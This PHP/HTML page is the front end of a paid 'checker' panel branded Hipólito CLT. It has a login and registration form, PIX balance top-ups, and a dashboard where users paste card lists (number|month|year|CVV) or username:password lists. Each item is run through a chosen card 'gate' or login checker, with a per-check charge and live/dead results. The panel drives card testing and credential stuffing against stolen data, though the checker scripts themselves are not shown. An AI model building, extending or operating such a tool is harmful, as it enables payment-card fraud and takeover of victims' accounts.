.auth-card:before{content:"";position:absolute;left:35px;right:35px;top:0;height:1px;background:linear-gradient(90deg,transparent,var(--lime),transparent);opacity:.8}
.card-kicker{color:var(--lime);font-size:10px;letter-spacing:.18em;text-transform:uppercase;font-weight:800;margin-bottom:13px}
h2{font-size:30px;letter-spacing:-.055em;margin:0 0 9px}.sub{font-size:12px;line-height:1.7;color:var(--muted);margin:0 0 27px}
.tabs{display:grid;grid-template-columns:1fr 1fr;padding:4px;border:1px solid var(--line);background:#080a09;border-radius:12px;margin-bottom:25px;gap:4px}.tab{border:0;border-radius:9px;padding:11px 8px;background:transparent;color:#8d978e;font:600 12px inherit;cursor:pointer;transition:.2s}.tab.active{background:#20281a;color:var(--lime);box-shadow:inset 0 0 0 1px #c8ff5221}
.field{margin:0 0 17px}.field label{display:block;color:#d4dbd4;font-size:11px;font-weight:650;margin-bottom:9px}.input-wrap{position:relative}.input-wrap svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:17px;height:17px;color:#758076;pointer-events:none}.field input{width:100%;height:49px;background:#0b0e0c;border:1px solid #ffffff15;border-radius:11px;padding:0 43px;color:#f2f6f1;font:13px inherit;outline:none;transition:border-color .2s,box-shadow .2s}.field input::placeholder{color:#59635b}.field input:focus{border-color:#b7ef4b8c;box-shadow:0 0 0 3px #c8ff5210}.toggle-pass{position:absolute;right:12px;top:50%;transform:translateY(-50%);border:0;background:none;color:#7f8a80;cursor:pointer;padding:5px}.toggle-pass svg{position:static;transform:none;width:17px;height:17px}
.rowline{display:flex;justify-content:space-between;align-items:center;gap:10px;margin:4px 0 22px;font-size:11px;color:#9aa49b}.remember{display:flex;align-items:center;gap:8px;cursor:pointer}.remember input{accent-color:var(--lime);width:14px;height:14px}.text-link{color:var(--lime);text-decoration:none}.text-link:hover{text-decoration:underline}
.submit{width:100%;height:51px;border:0;border-radius:11px;background:var(--lime);color:#10150b;font-weight:850;font-size:12px;letter-spacing:.02em;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:transform .2s,box-shadow .2s,background .2s}.submit:hover:not(:disabled){background:#d6ff7a;box-shadow:0 8px 30px #c8ff5220;transform:translateY(-1px)}.submit:disabled{opacity:.6;cursor:not-allowed}.submit svg{width:16px;height:16px}
.notice{padding:11px 13px;border-radius:10px;font-size:11px;line-height:1.6;margin-bottom:17px;display:none}.notice.error{background:#ff5f5f12;border:1px solid #ff77772c;color:#ffb0a9}.notice.ok{background:#c8ff5210;border:1px solid #c8ff5233;color:#d9fca3}.notice.warn{background:#fbbf2412;border:1px solid #fbbf2430;color:#fde68a}.notice.show{display:block}
.security{display:flex;align-items:center;justify-content:center;gap:7px;color:#737e74;font-size:10px;margin-top:21px}.security svg{width:13px;height:13px;color:#9dbb79}
.foot{position:absolute;bottom:24px;left:5.5%;right:5.5%;display:flex;justify-content:space-between;color:#667067;font-size:10px}.foot span:last-child{letter-spacing:.06em}

.dash-nav{position:sticky;top:0;z-index:50;backdrop-filter:blur(30px);background:rgba(9,11,10,.9);border-bottom:1px solid var(--line);padding:14px 5.5%;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
.dash-nav .brand{font-size:16px}
.dash-nav .right{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.bal-pill{background:#c8ff5210;border:1px solid #c8ff5240;padding:9px 16px;border-radius:11px;display:flex;align-items:center;gap:8px}
.bal-pill .lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;font-weight:700}
.bal-pill .val{font-size:15px;font-weight:800;color:var(--lime);font-family:'Courier New',monospace}
.user-pill{display:flex;align-items:center;gap:8px;background:#ffffff06;padding:7px 12px;border-radius:11px;border:1px solid var(--line)}
.user-pill .av{width:30px;height:30px;background:var(--lime);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:800;color:#10150a;font-size:13px}
.user-pill .nm{font-size:12px;font-weight:600}
.btn-out{padding:9px 14px;background:#ff5f5f10;border:1px solid #ff5f5f40;border-radius:10px;color:#ffb0a9;font-size:11px;font-weight:700;text-decoration:none;transition:all .2s;text-transform:uppercase;letter-spacing:.5px}
.btn-out:hover{background:#ff5f5f20}

.dash-wrap{max-width:1100px;margin:0 auto;padding:24px 5.5%}
.card{background:linear-gradient(180deg,rgba(20,25,22,.85),rgba(10,14,12,.9));backdrop-filter:blur(20px);border:1px solid var(--line);border-radius:18px;padding:22px;margin-bottom:18px;box-shadow:0 10px 40px #0004}
.card-title{font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:1.5px;color:var(--lime);margin-bottom:14px;display:flex;align-items:center;gap:10px}
.deposit-row{display:flex;gap:10px;align-items:stretch;flex-wrap:wrap}
.deposit-row input{flex:1;min-width:140px;padding:13px 16px;background:#080a09;border:1px solid var(--line);border-radius:11px;color:var(--text);font-size:15px;font-family:'Courier New',monospace;font-weight:700;outline:none}
.deposit-row input:focus{border-color:var(--lime);box-shadow:0 0 0 3px #c8ff5215}
.deposit-hint{font-size:11px;color:var(--muted);margin-top:8px}
.type-tabs{display:flex;gap:6px;margin-bottom:14px;background:#080a09;border-radius:12px;padding:5px;border:1px solid var(--line)}
.type-tab{flex:1;padding:10px;text-align:center;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;cursor:pointer;border-radius:9px;color:var(--muted);transition:all .2s;background:none;border:none;font-family:inherit}
.type-tab.active{background:var(--lime);color:#10150a;box-shadow:0 3px 12px #c8ff5230}
.gates-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px}
.gate-card{background:#080a09;border:1.5px solid var(--line);border-radius:12px;padding:14px;cursor:pointer;transition:all .25s;position:relative;overflow:hidden}
.gate-card:hover{border-color:#c8ff5250;transform:translateY(-2px)}
.gate-card.sel{border-color:var(--lime);background:#c8ff520a;box-shadow:0 0 20px #c8ff5220}
.gate-card .top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px}
.gate-card .ext{font-size:9px;font-weight:800;padding:2px 7px;border-radius:6px;background:#c8ff5220;color:var(--lime);text-transform:uppercase;letter-spacing:.5px}
.gate-card .nm{font-size:12px;font-weight:700;color:var(--text);word-break:break-all;font-family:'Courier New',monospace}
.gate-card .tp{font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
textarea.lista{width:100%;min-height:110px;padding:14px;background:#080a09;border:1px solid var(--line);border-radius:12px;color:var(--text);font-family:'Courier New',monospace;font-size:12px;outline:none;resize:vertical}
textarea.lista:focus{border-color:var(--lime);box-shadow:0 0 0 3px #c8ff5215}
.action-row{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
.btn{padding:11px 18px;border:none;border-radius:11px;font-size:12px;font-weight:700;cursor:pointer;transition:all .2s;font-family:inherit;text-transform:uppercase;letter-spacing:.8px}
.btn:disabled{opacity:.4;cursor:not-allowed}
.btn-primary{background:var(--lime);color:#10150a;box-shadow:0 4px 16px #c8ff5220}
.btn-primary:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 8px 24px #c8ff5240}
.btn-ghost{background:#ffffff08;border:1.5px solid var(--line);color:var(--text)}
.btn-ghost:hover{border-color:var(--lime);color:var(--lime)}
.stats-inline{display:flex;gap:16px;flex-wrap:wrap;font-size:11px;color:var(--muted);margin-top:12px;font-weight:500}
.stats-inline strong{color:var(--text);font-family:'Courier New',monospace}
.results{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:20px}
.res-box{background:#080a09;border:1.5px solid var(--line);border-radius:14px;padding:14px;max-height:400px;overflow-y:auto}
.res-box.live{border-color:#c8ff5240}
.res-box.die{border-color:#ff5f5f40}
.res-box h3{font-size:11px;text-transform:uppercase;letter-spacing:1.2px;margin-bottom:10px;display:flex;align-items:center;gap:8px;color:var(--text)}
.res-box.live h3{color:var(--lime)}
.res-box.die h3{color:#ffb0a9}
.res-item{background:#0006;border-left:3px solid;border-radius:8px;padding:10px 12px;margin-bottom:8px;font-family:'Courier New',monospace;font-size:11px;line-height:1.5}
.res-item.live{border-color:var(--lime)}
.res-item.die{border-color:var(--red)}
.res-item .hd{font-weight:700;margin-bottom:5px;word-break:break-all}
.res-item.live .hd{color:var(--lime)}
.res-item.die .hd{color:#ffb0a9}
.res-item .body{color:#ffffffc0;white-space:pre-wrap;word-break:break-word;max-height:150px;overflow-y:auto}

.pix-modal{position:fixed;inset:0;background:#000e;backdrop-filter:blur(8px);z-index:200;display:none;align-items:center;justify-content:center;padding:20px}
.pix-modal.show{display:flex}
.pix-box{background:linear-gradient(180deg,#0d100e,#080a09);border:1px solid #c8ff5240;border-radius:22px;padding:28px;max-width:440px;width:100%;max-height:90vh;overflow-y:auto;position:relative;box-shadow:0 30px 80px #000b}
.pix-close{position:absolute;top:14px;right:14px;width:34px;height:34px;background:#ffffff08;border:none;border-radius:10px;color:var(--muted);font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.pix-close:hover{background:#ff5f5f20;color:#ffb0a9}
.pix-box h2{text-align:center;font-size:18px;font-weight:800;margin-bottom:6px;color:var(--lime)}
.pix-box .sub{text-align:center;font-size:12px;color:var(--muted);margin-bottom:20px}
.pix-qr{background:#fff;padding:16px;border-radius:14px;margin-bottom:16px;text-align:center}
.pix-qr img{max-width:220px;width:100%;display:block;margin:0 auto;border-radius:8px}
.pix-copy-label{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;font-weight:700}
.pix-copy{background:#0008;border:1.5px solid #c8ff5240;border-radius:11px;padding:14px;font-family:'Courier New',monospace;font-size:10px;word-break:break-all;color:#c8ff52;cursor:pointer;margin-bottom:14px;line-height:1.5;transition:all .2s}
.pix-copy:hover{border-color:var(--lime)}
.pix-status{text-align:center;font-size:12px;color:var(--muted);display:flex;align-items:center;justify-content:center;gap:8px}
.pix-status .dot{width:8px;height:8px;border-radius:50%;background:var(--lime);box-shadow:0 0 10px var(--lime);animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.85)}}
.pix-timer{margin-top:10px;text-align:center;font-size:11px;color:var(--muted);font-family:'Courier New',monospace}

@media(max-width:900px){.shell{grid-template-columns:1fr;max-width:600px;padding:24px 22px}.topbar{position:relative;left:auto;right:auto;top:auto;grid-row:1}.intro{padding:65px 0 15px;max-width:none}.intro h1{font-size:clamp(45px,10vw,70px)}.lead{margin:18px 0 22px}.feature{display:none}.visual{display:none}.auth-wrap{padding:20px 0 75px}.auth-card{max-width:480px}.foot{left:22px;right:22px;bottom:16px}.status{font-size:9px}.dash-nav{padding:12px 20px}.dash-wrap{padding:16px 20px}}
@media(max-width:420px){.shell{padding:19px 15px}.brand{font-size:15px}.brand-mark{width:34px;height:34px}.status{padding:8px;font-size:8px}.intro{padding-top:48px}.auth-card{padding:24px 19px;border-radius:20px}h2{font-size:27px}.foot{left:15px;right:15px;font-size:9px}.results{grid-template-columns:1fr}}
@media(prefers-reduced-motion:reduce){*,*:before,*:after{animation:none!important;transition:none!important}}
</style>
</head>
<body>
<?php if (!$user): ?>
<div class="orb"></div><div class="orb two"></div>
<main class="shell">
  <header class="topbar">
    <div class="brand">
      <div class="brand-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none"><path d="M5 18V6l7 8 7-8v12M5 6h14" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
      HIPÓLITO <span style="color:var(--lime)">CLT</span>
    </div>
    <div class="status"><i></i> Portal de acesso</div>
  </header>

  <section class="intro">
    <div class="eyebrow">Seu próximo nível começa aqui</div>
    <h1>Trabalho sério.<br><span>Outro nível.</span></h1>
    <p class="lead">Seu espaço, suas ferramentas, sua evolução. Entre na plataforma e continue de onde parou.</p>
    <div class="feature">
      <div class="feature-icon"><svg viewBox="0 0 24 24" fill="none"><path d="M12 3l7 3v5c0 4.5-3 7.5-7 10-4-2.5-7-5.5-7-10V6l7-3z" stroke="currentColor" stroke-width="1.7"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
      <div><strong>Seu espaço protegido</strong><small>Acesso pessoal em uma interface simples e direta.</small></div>
    </div>
    <div class="visual">
      <div class="visual-number">01<span style="font-size:20px">/</span>∞</div>
      <div class="visual-copy">Foco no que importa.<br>Sem complicação.<br>Do seu jeito.</div>
    </div>
  </section>

  <section class="auth-wrap">
    <div class="auth-card">
      <div class="card-kicker">Bem-vindo à plataforma</div>
      <h2 id="formTitle">Que bom ter você.</h2>
      <p class="sub" id="formSub">Entre com seus dados para acessar sua conta.</p>

      <div class="tabs" role="tablist">
        <button class="tab active" type="button" id="loginTab">Entrar</button>
        <button class="tab" type="button" id="registerTab">Criar conta</button>
      </div>

      <div class="notice" id="msg"></div>

      <form id="authForm" autocomplete="off" onsubmit="return false;">
        <input type="hidden" name="mode" id="modeInput" value="login">
        <input type="text" name="website" id="hp_field" tabindex="-1" autocomplete="off" style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none" aria-hidden="true">
        <div class="field">
          <label for="username">Usuário</label>
          <div class="input-wrap">
            <svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="8" r="4" stroke="currentColor" stroke-width="1.7"/><path d="M4 20c.8-4 3.5-6 8-6s7.2 2 8 6" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/></svg>
            <input id="username" name="username" type="text" autocomplete="username" placeholder="Digite seu usuário" minlength="3" maxlength="20" required>
          </div>
        </div>
        <div class="field">
          <label for="password">Senha</label>
          <div class="input-wrap">
            <svg viewBox="0 0 24 24" fill="none"><rect x="4" y="10" width="16" height="11" rx="2" stroke="currentColor" stroke-width="1.7"/><path d="M8 10V7a4 4 0 018 0v3" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/></svg>
            <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Digite sua senha" minlength="8" required>
            <button class="toggle-pass" type="button" id="togglePass" aria-label="Mostrar senha"><svg viewBox="0 0 24 24" fill="none"><path d="M2.5 12s3.3-6 9.5-6 9.5 6 9.5 6-3.3 6-9.5 6-9.5-6-9.5-6z" stroke="currentColor" stroke-width="1.6"/><circle cx="12" cy="12" r="2.5" stroke="currentColor" stroke-width="1.6"/></svg></button>
          </div>
        </div>
        <div class="field" id="confirmField" hidden>
          <label for="confirm_password">Confirmar senha</label>
          <div class="input-wrap">
            <svg viewBox="0 0 24 24" fill="none"><rect x="4" y="10" width="16" height="11" rx="2" stroke="currentColor" stroke-width="1.7"/><path d="M8 10V7a4 4 0 018 0v3" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/></svg>
            <input id="confirm_password" name="confirm_password" type="password" autocomplete="new-password" placeholder="Digite a senha novamente" minlength="8">
          </div>
        </div>
        <div class="rowline" id="rowline">
          <label class="remember"><input type="checkbox" id="remember"> Manter conectado</label>
          <a class="text-link" href="#" id="forgotLink">Esqueci minha senha</a>
        </div>
        <button class="submit" type="submit" id="submitBtn"><span id="submitText">ACESSAR MINHA CONTA</span><svg viewBox="0 0 24 24" fill="none"><path d="M5 12h14m-6-6 6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
      </form>
      <div class="security"><svg viewBox="0 0 24 24" fill="none"><path d="M12 3l7 3v5c0 4.5-3 7.5-7 10-4-2.5-7-5.5-7-10V6l7-3z" stroke="currentColor" stroke-width="1.7"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg> Seus dados devem ser tratados com segurança</div>
    </div>
  </section>

  <footer class="foot"><span>© <?= date('Y') ?> Hipólito CLT</span><span>FEITO PARA IR ALÉM</span></footer>
</main>
<script>
const CSRF = <?= json_encode($csrf) ?>;
const loginTab = document.getElementById('loginTab');
const registerTab = document.getElementById('registerTab');
const modeInput = document.getElementById('modeInput');
const confirmField = document.getElementById('confirmField');
const confirmInput = document.getElementById('confirm_password');
const rowline = document.getElementById('rowline');
const title = document.getElementById('formTitle');
const sub = document.getElementById('formSub');
const submitText = document.getElementById('submitText');
const password = document.getElementById('password');
const username = document.getElementById('username');
const msg = document.getElementById('msg');
const btn = document.getElementById('submitBtn');
const hp = document.getElementById('hp_field');

function setMode(mode) {
  const register = mode === 'register';
  modeInput.value = mode;
  loginTab.classList.toggle('active', !register);
  registerTab.classList.toggle('active', register);
  confirmField.hidden = !register;
  confirmInput.required = register;
  rowline.hidden = register;
  title.textContent = register ? 'Crie seu acesso.' : 'Que bom ter você.';
  sub.textContent = register ? 'Preencha os dados abaixo para começar.' : 'Entre com seus dados para acessar sua conta.';
  submitText.textContent = register ? 'CRIAR MINHA CONTA' : 'ACESSAR MINHA CONTA';
  password.autocomplete = register ? 'new-password' : 'current-password';
  hideMsg();
}
loginTab.onclick = () => setMode('login');
registerTab.onclick = () => setMode('register');
document.getElementById('togglePass').onclick = () => {
  password.type = password.type === 'password' ? 'text' : 'password';
};
document.getElementById('forgotLink').onclick = (e) => {
  e.preventDefault();
  showMsg('Recuperação via suporte: @hipolitoofc', 'ok');
};
function showMsg(text, type) {
  msg.textContent = text;
  msg.className = 'notice ' + (type === 'ok' ? 'ok' : (type === 'warn' ? 'warn' : 'error')) + ' show';
}
function hideMsg() { msg.className = 'notice'; }

async function api(payload) {
  const r = await fetch(location.pathname, {
    method: 'POST',
    headers: {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'},
    body: JSON.stringify({...payload, csrf: CSRF, honeypot: hp.value}),
    credentials: 'same-origin'
  });
  const txt = await r.text();
  try { return JSON.parse(txt); }
  catch (e) { console.error('Resposta inválida:', txt); return {ok:false,error:'Erro no servidor'}; }
}

document.getElementById('authForm').onsubmit = async (e) => {
  e.preventDefault();
  hideMsg();
  const mode = modeInput.value;
  const u = username.value.trim();
  const p = password.value;
  if (!u || u.length < 3) return showMsg('Usuário com mínimo 3 caracteres.', 'error');
  if (!p || p.length < 8) return showMsg('Senha com mínimo 8 caracteres.', 'error');
  if (mode === 'register' && p !== confirmInput.value) return showMsg('As senhas não coincidem.', 'error');
  btn.disabled = true;
  submitText.textContent = mode === 'register' ? 'CRIANDO...' : 'ENTRANDO...';
  try {
    const payload = mode === 'register'
      ? {action:'register', username:u, password:p, confirm:confirmInput.value}
      : {action:'login', username:u, password:p};
    const j = await api(payload);
    if (j.ok) {
      showMsg(mode === 'register' ? '✅ Conta criada! Entrando...' : '✅ Login OK! Entrando...', 'ok');
      setTimeout(() => { location.href = j.redirect || 'index.php'; }, 400);
    } else {
      showMsg(j.error || 'Erro', 'error');
      btn.disabled = false;
      submitText.textContent = mode === 'register' ? 'CRIAR MINHA CONTA' : 'ACESSAR MINHA CONTA';
    }
  } catch (err) {
    showMsg('Erro de conexão. Tente novamente.', 'error');
    btn.disabled = false;
    submitText.textContent = mode === 'register' ? 'CRIAR MINHA CONTA' : 'ACESSAR MINHA CONTA';
  }
};
</script>
<?php else: ?>

<nav class="dash-nav">
    <div class="brand">
        <div class="brand-mark" style="width:34px;height:34px;border-radius:10px;font-size:16px">⚡</div>
        HIPÓLITO <span style="color:var(--lime)">CLT</span>
    </div>
    <div class="right">
        <div class="bal-pill"><span class="lbl">Saldo</span><span class="val" id="bal"><?= fmtMoney((float)$user['balance']) ?></span></div>
        <div class="user-pill"><div class="av"><?= strtoupper(substr($user['username'],0,1)) ?></div><span class="nm"><?= esc($user['username']) ?></span></div>
        <a href="?logout" class="btn-out">Sair</a>
    </div>
</nav>

<div class="dash-wrap">
    <div class="card">
        <div class="card-title">💳 Adicionar Saldo</div>
        <div class="deposit-row">
            <input type="number" id="dep-amount" min="<?= DEP_MIN ?>" max="<?= DEP_MAX ?>" step="0.01" value="20" placeholder="Valor">
            <button class="btn btn-primary" id="btn-pix" onclick="criarPix()">💰 Gerar PIX</button>
        </div>
        <div class="deposit-hint">Mínimo <?= fmtMoney(DEP_MIN) ?> · Máximo <?= fmtMoney(DEP_MAX) ?> · Via PIX</div>
        <div class="notice" id="pix-msg" style="margin-top:12px"></div>
    </div>

    <div class="card">
        <div class="card-title">🎯 Escolher Checker</div>
        <div class="type-tabs">
            <button class="type-tab active" onclick="setType('gate')">🎴 Gates</button>
            <button class="type-tab" onclick="setType('login')">🔐 Logins</button>
        </div>
        <div class="gates-grid" id="gates"></div>
    </div>

    <div class="card">
        <div class="card-title">📝 Dados</div>
        <div class="field" style="margin-bottom:12px">
            <label id="label-lista">Cartões (NÚMERO|MÊS|ANO|CVV)</label>
            <textarea class="lista" id="lista" placeholder="4532015112830366|12|2027|123"></textarea>
        </div>
        <div class="action-row">
            <button class="btn btn-primary" id="btn-run" onclick="runCheck()" disabled>▶ Iniciar</button>
            <button class="btn btn-ghost" onclick="stopCheck()">⏹ Parar</button>
            <button class="btn btn-ghost" onclick="clearAll()">🗑 Limpar</button>
        </div>
        <div class="stats-inline">
            <span>DIE: <strong><?= fmtMoney(DIE_COST) ?></strong></span>
            <span>LIVE: <strong><?= fmtMoney(LIVE_COST) ?></strong></span>
            <span>Processados: <strong id="st-proc">0</strong></span>
            <span>✅ <strong id="st-live" style="color:var(--lime)">0</strong></span>
            <span>❌ <strong id="st-die" style="color:#ffb0a9">0</strong></span>
        </div>
    </div>

    <div class="results">
        <div class="res-box live"><h3>✅ Aprovados</h3><div id="res-live"></div></div>
        <div class="res-box die"><h3>❌ Reprovados</h3><div id="res-die"></div></div>
    </div>
</div>

<div class="pix-modal" id="pix-modal">
    <div class="pix-box">
        <button class="pix-close" onclick="closePix()">✕</button>
        <h2>💰 PIX Gerado</h2>
        <div class="sub" id="pix-sub">Aguardando pagamento...</div>
        <div class="pix-qr"><img id="pix-img" src="" alt="QR"></div>
        <div class="pix-copy-label">Copia e Cola</div>
        <div class="pix-copy" id="pix-copy" onclick="copyPix()">—</div>
        <div class="pix-status"><span class="dot"></span>Aguardando confirmação...</div>
        <div class="pix-timer" id="pix-timer"></div>
    </div>
</div>

<script>
const CSRF = <?= json_encode($csrf) ?>;
const GATES = {gate:<?= json_encode($gates['gate']) ?>, login:<?= json_encode($gates['login']) ?>};
const PIX_COOLDOWN = <?= PIX_COOLDOWN ?>;
const PIX_DATA = <?= json_encode($pixData) ?>;
let curType='gate', curGate='', running=false, curBalance=<?= (float)$user['balance'] ?>;
let pixCountdownInterval = null;

async function api(payload) {
  const r = await fetch(location.pathname, {
    method:'POST',
    headers:{'Content-Type':'application/json', 'X-Requested-With':'XMLHttpRequest'},
    body: JSON.stringify({...payload, csrf: CSRF}),
    credentials:'same-origin'
  });
  const txt = await r.text();
  try { return JSON.parse(txt); }
  catch(e){ console.error('Não-JSON:', txt); return {ok:false,error:'Resposta inválida do servidor'}; }
}

function setType(t){
  curType=t; curGate='';
  document.querySelectorAll('.type-tab').forEach(x=>x.classList.remove('active'));
  document.querySelectorAll('.type-tab')[t==='gate'?0:1].classList.add('active');
  document.getElementById('label-lista').textContent = t==='gate'?'Cartões (NÚMERO|MÊS|ANO|CVV)':'Logins (USUÁRIO:SENHA)';
  document.getElementById('lista').placeholder = t==='gate'?'4532015112830366|12|2027|123':'usuario:senha';
  renderGates();
  document.getElementById('btn-run').disabled = true;
}

function renderGates(){
  const box=document.getElementById('gates'), arr=GATES[curType]||[];
  box.innerHTML='';
  if(!arr.length){box.innerHTML='<div style="grid-column:1/-1;text-align:center;padding:24px;color:var(--muted);font-size:12px">Nenhum checker em /'+curType+'/ ainda</div>';return}
  arr.forEach(f=>{
    const d=document.createElement('div'); d.className='gate-card';
    d.innerHTML=`<div class="top"><div class="nm">${f}</div><div class="ext">${f.split('.').pop()}</div></div><div class="tp">${curType==='gate'?'Cartão':'Login'}</div>`;
    d.onclick=()=>{curGate=f;document.querySelectorAll('.gate-card').forEach(x=>x.classList.remove('sel'));d.classList.add('sel');document.getElementById('btn-run').disabled=false};
    box.appendChild(d);
  });
}

function showPixMsg(text, type){
  const m = document.getElementById('pix-msg');
  m.textContent = text;
  m.className = 'notice ' + (type === 'ok' ? 'ok' : (type === 'warn' ? 'warn' : 'error')) + ' show';
}

async function checarPixPermitido(){
  try {
    const j = await api({action:'pix_allowed'});
    const btn = document.getElementById('btn-pix');
    const msg = document.getElementById('pix-msg');
    if (j.ok && !j.allowed) {
      btn.disabled = true;
      const wait = j.wait || 0;
      const min = Math.ceil(wait / 60);
      if (j.pending && j.pending.qr) {
        showPixMsg('⏳ Você tem um PIX pendente. Aguarde o pagamento ou ' + min + ' min para gerar outro.', 'warn');
        if (confirm('Deseja abrir o PIX pendente agora?')) {
          document.getElementById('pix-img').src = j.pending.qr;
          document.getElementById('pix-copy').textContent = j.pending.copy;
          document.getElementById('pix-sub').textContent = 'Valor: R$ ' + j.pending.amount.toFixed(2).replace('.',',');
          document.getElementById('pix-modal').classList.add('show');
          monitorPix(j.pending.txid);
        }
      } else {
        showPixMsg('⏳ Aguarde ' + min + ' min para gerar outro PIX.', 'warn');
      }
    } else {
      btn.disabled = false;
      msg.className = 'notice';
    }
  } catch(e){}
}

async function criarPix(){
  const amt=parseFloat(document.getElementById('dep-amount').value);
  if(!amt||amt<<?= DEP_MIN ?>||amt><?= DEP_MAX ?>) return showPixMsg('Valor entre <?= fmtMoney(DEP_MIN) ?> e <?= fmtMoney(DEP_MAX) ?>', 'error');
  try{
    const j=await api({action:'deposit',amount:amt});
    if(!j.ok){ showPixMsg(j.error||'Erro', 'error'); return; }
    document.getElementById('pix-img').src=j.qr;
    document.getElementById('pix-copy').textContent=j.copy;
    document.getElementById('pix-sub').textContent='Valor: R$ '+j.amount.toFixed(2).replace('.',',');
    document.getElementById('pix-modal').classList.add('show');
    document.getElementById('pix-msg').className='notice';
    monitorPix(j.txid);
  }catch(e){showPixMsg('Erro de conexão', 'error')}
}

function monitorPix(txid){
  const start = Date.now();
  if (pixCountdownInterval) clearInterval(pixCountdownInterval);
  pixCountdownInterval = setInterval(() => {
    const el = document.getElementById('pix-timer');
    if (el) {
      const elapsed = Math.floor((Date.now() - start) / 1000);
      const left = Math.max(0, PIX_COOLDOWN - elapsed);
      if (left > 0) {
        const m = Math.floor(left / 60), s = left % 60;
        el.textContent = 'Expira em ' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
      } else {
        el.textContent = 'PIX expirado. Você pode gerar outro.';
        clearInterval(pixCountdownInterval);
      }
    }
  }, 1000);

  const iv=setInterval(async()=>{
    if(!document.getElementById('pix-modal').classList.contains('show')){clearInterval(iv);if(pixCountdownInterval)clearInterval(pixCountdownInterval);return}
    try{const j=await api({action:'status',txid:txid});
      if(j.ok&&j.status==='paid'){
        clearInterval(iv); if(pixCountdownInterval)clearInterval(pixCountdownInterval);
        document.getElementById('pix-sub').textContent='✅ Pago! Saldo atualizado';
        document.getElementById('pix-sub').style.color='var(--lime)';
        document.getElementById('pix-timer').textContent='';
        setTimeout(()=>{closePix();location.reload()},1500);
      } else if (j.ok && j.status === 'expired') {
        clearInterval(iv); if(pixCountdownInterval)clearInterval(pixCountdownInterval);
        document.getElementById('pix-sub').textContent='⏱ PIX expirado';
        document.getElementById('pix-timer').textContent='Você pode gerar outro agora';
      }
    }catch(e){}
  },4000);
}

function closePix(){
  document.getElementById('pix-modal').classList.remove('show');
  if(pixCountdownInterval) clearInterval(pixCountdownInterval);
  checarPixPermitido();
}

function copyPix(){const t=document.getElementById('pix-copy').textContent;navigator.clipboard.writeText(t).then(()=>{const el=document.getElementById('pix-copy');el.style.borderColor='var(--lime)';setTimeout(()=>el.style.borderColor='#c8ff5240',1000)})}

async function runCheck(){
  if(!curGate) return alert('Escolha um checker');
  const lista=document.getElementById('lista').value.trim();
  if(!lista) return alert('Cole os dados');
  const items=lista.split('\n').filter(l=>l.trim());
  if(!items.length) return;
  running=true; let idx=0,live=0,die=0;
  clearAll();
  while(running && idx<items.length){
    const it=items[idx];
    try{
      const j=await api({action:'check',gate:curGate,type:curType,lista:it});
      if(!j.ok){addRes(it,'❌ '+(j.error||'Erro'),false);die++}
      else{addRes(it,j.response,j.live);if(j.live)live++;else die++;curBalance=j.balance;document.getElementById('bal').textContent='R$ '+j.balance.toFixed(2).replace('.',',')}
    }catch(e){addRes(it,'❌ Erro conexão',false);die++}
    idx++;
    document.getElementById('st-proc').textContent=idx;
    document.getElementById('st-live').textContent=live;
    document.getElementById('st-die').textContent=die;
    if(running && idx<items.length) await new Promise(r=>setTimeout(r,1500));
  }
  running=false;
}
function stopCheck(){running=false}
function clearAll(){document.getElementById('res-live').innerHTML='';document.getElementById('res-die').innerHTML='';document.getElementById('st-proc').textContent='0';document.getElementById('st-live').textContent='0';document.getElementById('st-die').textContent='0'}
function addRes(input,resp,isLive){
  const box=document.getElementById(isLive?'res-live':'res-die');
  const d=document.createElement('div'); d.className='res-item '+(isLive?'live':'die');
  d.innerHTML=`<div class="hd">${input.length>60?input.substring(0,60)+'...':input}</div><div class="body">${resp.replace(/</g,'&lt;')}</div>`;
  box.insertBefore(d,box.firstChild);
}

document.addEventListener('DOMContentLoaded',()=>{
  renderGates();
  checarPixPermitido();
  if (PIX_DATA) {
    showPixMsg('⏳ Você tem um PIX pendente de ' + ('R$ ' + PIX_DATA.amount.toFixed(2).replace('.',',')), 'warn');
  }
});
</script>
<?php endif; ?>
</body>
</html>
